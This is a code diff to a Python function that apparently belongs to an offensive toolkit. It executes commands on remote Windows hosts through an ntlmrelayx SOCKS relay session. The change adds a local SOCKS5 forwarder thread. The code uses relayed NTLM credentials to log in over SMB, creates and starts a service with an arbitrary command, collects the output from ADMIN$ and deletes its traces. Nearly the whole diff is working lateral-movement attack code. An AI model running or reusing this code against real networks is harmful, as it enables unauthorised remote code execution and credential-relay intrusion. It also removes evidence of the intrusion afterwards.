@@ -236,10 +236,22 @@ def _scm_exec_relay(host, auth, command, cwd, timeout=120, verbose=False):
     SMBConnection so proxychains only triggers one NTLM auth exchange against
     ntlmrelayx — matching the susinternals -socks pattern.  Use this when
     --socks is set (ntlmrelayx --socks relay session via proxychains).
+
+    Routing:
+      proxychains-ng 4.x in LD_PRELOAD → Python sockets intercepted automatically.
+      proxychains 3.x / none           → local TCP→SOCKS5 forwarder thread routes
+                                         SMBConnection through ntlmrelayx:1080
+                                         directly (no hook needed; ntlmrelayx is
+                                         always local).
     """
     import io as _io
+    import socket as _socket
+    import threading as _threading
     from impacket.smbconnection import SMBConnection
     from impacket.dcerpc.v5 import scmr, transport as dce_transport
+    from titanlib.relay_proxy import (_socks5_connect,
+                                      _find_proxychains_conf,
+                                      _parse_socks5_upstream)
 
     def _get(flag):
         try:
@@ -261,60 +273,140 @@ def _scm_exec_relay(host, auth, command, cwd, timeout=120, verbose=False):
         print(f'  [relay-exec] svc={svc_name}  out={out_win}', file=sys.stderr)
         print(f'  [relay-exec] user={domain}\\{username}  ip={ip}', file=sys.stderr)
 
-    smb = None
-    for attempt in range(3):
-        try:
-            smb = SMBConnection(ip, ip, sess_port=445)
-            smb.login(username, '', domain, lmhash='', nthash=nt_hash)
-            break
-        except Exception as e:
-            if attempt < 2:
-                print(f'  [relay-exec] auth failed — waiting for relay session...', file=sys.stderr)
-                time.sleep(4)
-            else:
-                return f'[!] Relay exec failed: {e}\n', 1
+    # proxychains-ng 4.x intercepts Python socket calls automatically.
+    # proxychains 3.x and bare invocations do not — spin up a forwarder.
+    pc4_active = 'proxychains.so.4' in os.environ.get('LD_PRELOAD', '').lower()
 
-    try:
-        rpc = dce_transport.SMBTransport(ip, filename=r'\svcctl', smb_connection=smb)
-        dce = rpc.get_dce_rpc()
-        dce.connect()
-        dce.bind(scmr.MSRPC_UUID_SCMR)
+    smb_host = ip
+    smb_port = 445
+    stop_fwd = None
 
-        scm_h = scmr.hROpenSCManagerW(dce)['lpScHandle']
-        svc_h = scmr.hRCreateServiceW(dce, scm_h, svc_name, svc_name,
-                                       lpBinaryPathName=bin_path)['lpServiceHandle']
-        try:
-            scmr.hRStartServiceW(dce, svc_h)
-        except Exception:
-            pass  # cmd.exe exits without calling SetServiceStatus → timeout is expected
-
-        deadline = time.monotonic() + min(timeout, 30)
-        out = ''
-        while time.monotonic() < deadline:
-            time.sleep(1)
+    if not pc4_active:
+        # Read ntlmrelayx SOCKS address from proxychains conf (default 127.0.0.1:1080).
+        relay_host, relay_port = '127.0.0.1', 1080
+        conf = _find_proxychains_conf()
+        if conf:
             try:
-                buf = _io.BytesIO()
-                smb.getFile('ADMIN$', f'Temp\\{out_fname}', buf.write)
-                out = buf.getvalue().decode('utf-8', errors='replace').strip()
-                if out:
-                    break
+                relay_host, relay_port = _parse_socks5_upstream(conf)
             except Exception:
                 pass
 
+        if verbose:
+            print(f'  [relay-exec] forwarder: 127.0.0.1:* → '
+                  f'ntlmrelayx {relay_host}:{relay_port} → {ip}:445',
+                  file=sys.stderr)
+
+        # Listener on a random local port.  Each incoming SMBConnection triggers
+        # a fresh SOCKS5 tunnel to ntlmrelayx.  Because relay_host is 127.0.0.1
+        # the connect goes direct — no proxychains hook required.
+        srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+        srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
+        srv.bind(('127.0.0.1', 0))
+        srv.listen(10)
+        smb_host = '127.0.0.1'
+        smb_port = srv.getsockname()[1]
+        fwd_stop = _threading.Event()
+
+        def _pipe(a, b):
+            try:
+                while True:
+                    d = a.recv(65536)
+                    if not d:
+                        break
+                    b.sendall(d)
+            except Exception:
+                pass
+            finally:
+                for s in (a, b):
+                    try: s.close()
+                    except Exception: pass
+
+        def _handle(client):
+            try:
+                relay = _socks5_connect(relay_host, relay_port, ip, 445)
+                _threading.Thread(target=_pipe, args=(relay, client),
+                                   daemon=True).start()
+                _pipe(client, relay)
+            except Exception:
+                pass
+            finally:
+                try: client.close()
+                except Exception: pass
+
+        def _accept():
+            srv.settimeout(0.5)
+            while not fwd_stop.is_set():
+                try:
+                    conn, _ = srv.accept()
+                    _threading.Thread(target=_handle, args=(conn,),
+                                       daemon=True).start()
+                except _socket.timeout:
+                    continue
+                except Exception:
+                    break
+
+        _threading.Thread(target=_accept, daemon=True).start()
+
+        def stop_fwd():
+            fwd_stop.set()
+            try: srv.close()
+            except Exception: pass
+
+    smb = None
+    try:
+        for attempt in range(3):
+            try:
+                # remoteName=ip so SMB SESSION_REQUEST uses the real server name;
+                # remoteHost=smb_host routes TCP to the forwarder (or direct if pc4).
+                smb = SMBConnection(ip, smb_host, sess_port=smb_port)
+                smb.login(username, '', domain, lmhash='', nthash=nt_hash)
+                break
+            except Exception as e:
+                if attempt < 2:
+                    print(f'  [relay-exec] auth failed — waiting for relay session...',
+                          file=sys.stderr)
+                    time.sleep(4)
+                else:
+                    return f'[!] Relay exec failed: {e}\n', 1
+
         try:
-            scmr.hRDeleteService(dce, svc_h)
-        except Exception:
-            pass
-        try:
-            scmr.hRCloseServiceHandle(dce, svc_h)
-        except Exception:
-            pass
-        try:
-            smb.deleteFile('ADMIN$', f'Temp\\{out_fname}')
-        except Exception:
-            pass
-    except Exception as e:
-        return f'[!] Relay exec error: {e}\n', 1
+            rpc = dce_transport.SMBTransport(ip, filename=r'\svcctl', smb_connection=smb)
+            dce = rpc.get_dce_rpc()
+            dce.connect()
+            dce.bind(scmr.MSRPC_UUID_SCMR)
+
+            scm_h = scmr.hROpenSCManagerW(dce)['lpScHandle']
+            svc_h = scmr.hRCreateServiceW(dce, scm_h, svc_name, svc_name,
+                                           lpBinaryPathName=bin_path)['lpServiceHandle']
+            try:
+                scmr.hRStartServiceW(dce, svc_h)
+            except Exception:
+                pass  # cmd.exe exits without SetServiceStatus → timeout expected
+
+            deadline = time.monotonic() + min(timeout, 30)
+            out = ''
+            while time.monotonic() < deadline:
+                time.sleep(1)
+                try:
+                    buf = _io.BytesIO()
+                    smb.getFile('ADMIN$', f'Temp\\{out_fname}', buf.write)
+                    out = buf.getvalue().decode('utf-8', errors='replace').strip()
+                    if out:
+                        break
+                except Exception:
+                    pass
+
+            try: scmr.hRDeleteService(dce, svc_h)
+            except Exception: pass
+            try: scmr.hRCloseServiceHandle(dce, svc_h)
+            except Exception: pass
+            try: smb.deleteFile('ADMIN$', f'Temp\\{out_fname}')
+            except Exception: pass
+        except Exception as e:
+            return f'[!] Relay exec error: {e}\n', 1
+    finally:
+        if stop_fwd:
+            stop_fwd()
 
     return (out + '\n') if out else '[!] Relay exec: no output\n', 0 if out else 1
 
